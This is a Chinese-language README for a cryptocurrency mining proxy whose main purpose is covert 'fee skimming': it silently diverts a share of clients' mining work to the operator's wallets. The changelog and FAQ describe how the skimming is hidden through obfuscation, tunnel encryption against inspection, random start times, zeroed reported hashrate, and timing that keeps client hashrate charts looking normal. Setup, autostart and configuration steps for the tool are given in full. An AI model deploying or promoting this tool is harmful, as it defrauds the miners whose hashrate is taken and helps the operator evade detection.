# vsminer

### 简单稳定的强加密中转+隐藏式抽水系统，以太坊抽水，比特币抽水，莱特币等多币种抽水，ssl加密中转，https加密中转软件

## 更新日志

```
2022-05-10     	    1.2完美版>>>
		    1. 修复bug,优化BTC,LTC,ETC抽水逻辑更具隐蔽性，巩固稳定性，深度隧道隐藏，三端强混淆
```

# 交流

Telegram:
电报加群链接(https://t.me/+hj8iSYpAAgFiNmM1)
![img](images/telegram.png)

QQ群：

![img](images/QQ.png)

# 项目介绍

该项目提供了抽水和转发功能，支持跨矿池抽水。不设置抽水上限，并且具有更低的内抽费用。该功能可以关闭，在关闭时作为纯转发程序使用，**支持BTC, ETH，LTC，ETC，Ton, BCH，RVN，ERG, CFX，SCP。**

软件仅供学习参考，请勿用于其他目的，不承担任何责任。
 

**注意！本项目不同于隔壁miner-proxy，曹操，老矿等，是自己的项目！**

# 后续更新

- [x] 支持ton的双挖转发和抽水
- [x] 支持一键启动脚本

- [x] 支持矿机端和服务器端隧道加密，防止SSL转发被查问题
- [ ] 支持web端启动和统一后台启动


# 详细图文教程
http://dlj.bz/pdf


# 使用方法

## 1. 最简单的启动方法

**Windows直接网页下载项目，Linux或ubuntu系统下载项目：**

```
git clone https://github.com/vsminer/vsminer.git
cd vsminer/linux
sudo chmod 777 vsminer.proxy 
./vsminer.proxy -conf /root/vsminer/linux/config.yaml
```


**Windows直接网页下载ZIP文件，解压，进入windows文件夹，点击bat文件即可运行：**

在**config文件夹**中有**配置文件**，修改**配置yaml文件**中的端口、钱包、抽水比例即可自定义启动:
 
**配置多个config文件，指定不同config.yaml来启动多个矿池抽水转发端口**

```bash
./vsminer.proxy -conf /root/vsminer/linux/config.yaml
./vsminer.proxy -conf /root/vsminer/linux/config2.yaml
./vsminer.proxy -conf /root/vsminer/linux/config3.yaml
```
 
**云服务器需要打开对应本地端口的安全组（防火墙）**

## 2. 完整配置config.yaml方式启动

**修改config.yaml文件**

```bash
# 代币类型，目前支持：eth/etc/rvn/erg/cfx/btc/ltc/scp/ltc
coin_type: "eth"
# 程序本地转发端口
local_addr: ":9998"
# 是否启用客户端 SSL 加密, 如果内核里边使用 SSL 连接的话，需要设置这个选项为 true
enable_client_ssl: true
# 远程代理地址，常用地址（E池/鱼池/币印等）已经内置 SSL/TCP 判断
remote_addr: "asia2.ethermine.org:5555"
# 是否启用服务端 SSL 加密
# 大部分常用矿池已经自动进行了判断，无需特殊设置，若设置为 true，则优先级最高
enable_server_ssl: false
# 抽水比例(支持小数)，最高 100，默认值 0，不抽水
devfee_rate: 1.3
# 抽水钱包，请务必自行确认其有效性
wallet: "0xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
# 多人抽水能力支持，当存在 wallets 时候，会覆盖 wallet 参数
# shares 仅支持整数，且所有 shares 的和应为 (0,10]，超出范围会直接终止程序运行（注意前开后闭）
# shares 为 0 意味暂时不为该地址就行 shares 分配，请知悉
# 例: shares 1:1 意味着两个地址，每两波抽水，每个人拿走一波，跟抽水比例无关，2:1 则A拿走两波，B一波
# 单人抽水的话，可以直接删除wallets参数，也可以只填一个content，删除多余的content
# 支持最多10个人分成，复制多对 content-shares 添加在下面即可
wallets:
  - content: "0xxxxxxxxx001"
    shares: 1
  - content: "0xxxxxxxxx002"
    shares: 1
# 开启性能模式：解除 ulimit -n 1024 限制, Windows为关，Linux为开
enable_performance_mode: false
# 开启利润优先模式，默认为 true, 开启此模式后，会优先保证抽水收益，可能会导致抽水比例略微超过设定值
# NOTICE：如果机器频繁掉线，不建议开启
enable_profit_mode: true
# 开启新抽水逻辑，低于 6% 建议使用新逻辑，会让算力曲线更加平稳, 高抽水比例时，关闭此项可能会提抽水收益
is_experiment_devfee: true
# 抽水矿池地址，默认使用转发矿池地址
devfee_addr: ""
# 是否启用抽水 SSL 加密, 大部分常用矿池已经自动进行了判断，无需特殊设置，若设置 true，则优先级最高
enable_devfee_ssl: false
# 抽水时候指定的统一 worker 名称
devfee_worker: ""
# web端本地地址, 格式同 local_addr
dashboard_addr: ""
# 管理员 token
dashboard_admin_token: "tax-yyds"
# 观察者 token
dashboard_observer_token: "tax-yyds"
```

 

### 3. 后台启动

测试成功后可以``ctrl+c``杀死进程后，使用**后台启动**：

```
nohup ./vsminer.proxy -conf /root/vsminer/linux/config.yaml
```

即可后台运行，这样可以实现关掉命令行窗口后，矿机依然可以连上节点，保持抽水和中转的运行。

查看后台运行情况

```bash
tail -f /tmp/tax_proxy--端口.stat.log
```

停止后台运行的程序

输入

```
ps -aux | grep "vsminer.proxy"
```
得到进程id

```
kill -9 进程id
```

即可删除后台运行软件

或者用终端软件tmux
 

### 4. 开机自启动，进程守护，设置开机自启动后，自动后台运行

执行pwd获取当前路径，并复制输出

```
pwd
```

安装:

```
./vsminer.proxy -conf pwd的结果/config.yaml -install
```

删除开机自启：

```
./vsminer.proxy -conf pwd的结果/config.yaml -remove
```

光安装自启动程序不会自动运行，需要重启服务器或者用以下命令运行

运行：

```
./vsminer.proxy -conf pwd的结果/config.yaml -start
```

停止：
 
```
./vsminer.proxy -conf pwd的结果/config.yaml -stop
```

如果需要修改本地端口，需要先删除开机自启动再修改，修改完后再安装。

## 本地加密端使用方式 

**使用本地端加密时候，服务器启动的config中，加密模式选 “2”**

```bash
# 加密模式
# 0: 不启用加密，1：客户端（发送加密数据）2：服务端（接收加密数据）
encrypt_mode: 2
```

**前台启动**

```
vsminer.connector -l :本地端口 -r 服务器ip:服务器端口
```

**进程守护+开机自启**

```
vsminer.connector -l :本地端口 -r 服务器ip:服务器端口 -install
vsminer.connector -l :本地端口 -r 服务器ip:服务器端口 -start
```

**注意：使用隧道混淆模式在纯转发时，会有0.1%的抽水，如果仅仅使用ssl来纯转发则不会有**

**windows直接编辑批处理文件修改参数保存，双击批处理文件运行connector**

**给只能用tcp协议的专业矿机套上ssl，只需要在矿机局域网的一台机器上装tax.miner.proxy,将tcp转成ssl，然后让矿机连这个局域网的proxy即可。从局域网的proxy到服务器这一段是ssl加密的**






# 答疑

**1. 抽水机曲线心电图**

正常，因为我用的方法是按照时间，是在矿池发现机器掉线之前切换抽水和挖矿，所以客户机器不会心电图，而抽水机器会，不影响收益。这样做的好处是不会因为份额替换产生高的拒绝率，坏处就是抽水机心电图，得看24小时算力来算算自己抽了多少。

**2. 统一抽水worker后reported为0**

统一抽水之后往矿池提交的report算力被我们设置为0，并不影响收益，收益计算靠的是份额，平均算力是正常的。

**3. 开起来一段时间没有抽水**

同问题1，抽水会在一小时内随机启动

**4. 关于利润优先模式和新抽水逻辑**

抽水btc的时候请使用新逻辑，以太坊如果出现客户那边心电图的话，可以切换回老抽水模式试试。对网吧等频繁启停矿机的应用场景，推荐关闭利润优先模式，不然可能比预期的抽的多。

# 开发费用

开发费用从0.25%起随着抽水比例的提高线性上浮，在抽10%时开发费用0.75%, 同时支持满抽100，满抽时候开发会抽10%，纯转发功能时不抽水。请大家善良使用。
